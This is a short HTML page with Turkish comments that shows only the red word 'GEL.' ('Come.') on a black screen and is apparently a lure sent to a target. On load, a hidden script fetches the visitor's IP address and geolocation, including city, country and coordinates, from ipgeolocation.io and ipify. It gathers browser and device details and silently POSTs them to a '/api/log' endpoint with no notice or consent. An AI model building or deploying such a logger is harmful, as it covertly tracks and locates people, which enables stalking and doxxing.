<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: black;
      color: red;
      font-size: 50px;
      font-weight: bold;
      text-align: center;
    }
  </style>
</head>
<body>
  GEL.

  <script>
    // 1) ipgeolocation.io üzerinden IP tabanlı konum bilgisi almak
    async function getIPLocation() {
      try {
        // ipgeolocation.io hesabınızdan aldığınız API Key'i buraya ekleyin:
        const apiKey = "YOUR_API_KEY"; // Örnek: "8f25..."
        
        // API isteği
        const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}`);
        const data = await res.json();
        // data muhtemel örnek:
        // {
        //   "ip": "8.8.8.8",
        //   "country_name": "United States",
        //   "city": "Mountain View",
        //   "latitude": 37.4056,
        //   "longitude": -122.0775,
        //   ...
        // }

        return data;
      } catch (error) {
        console.error("IP tabanlı konum alınırken hata oluştu:", error);
        return null;
      }
    }

    // 2) Kullanıcının gerçek IP'sini (api64.ipify.org) almak (isteğe bağlı)
    async function getUserIP() {
      try {
        const res = await fetch('https://api64.ipify.org?format=json'); 
        const data = await res.json();
        return data.ip;
      } catch (error) {
        console.error("IP alınırken hata oluştu:", error);
        return "Bilinmeyen";
      }
    }

    // 3) Tüm verileri birleştirip sunucuya gönder
    async function sendData() {
      // ipgeolocation.io'dan gelen konum
      const ipData = await getIPLocation();

      // ipify'den gelen "gerçek" IP (isteğe bağlı)
      const fallbackIP = await getUserIP();

      // IP tabanlı sonuç yoksa "Konum alınamadı"
      let finalIP = fallbackIP;
      let finalLocation = "Konum alınamadı";
      let lat = null;
      let lon = null;

      if (ipData) {
        finalIP = ipData.ip || fallbackIP; // ipgeolocation.io ip yoksa fallback
        const city = ipData.city || "Bilinmeyen";
        const country = ipData.country_name || "Bilinmeyen";
        finalLocation = `${city}, ${country}`;
        lat = ipData.latitude || null;
        lon = ipData.longitude || null;
      }

      let userData = {
        ip: finalIP,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        language: navigator.language,
        location: finalLocation,
        latitude: lat,
        longitude: lon
      };

      // Sunucuya POST isteği
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
      });
    }

    // Sayfa açıldığında çalıştır
    sendData();
  </script>
</body>
</html>
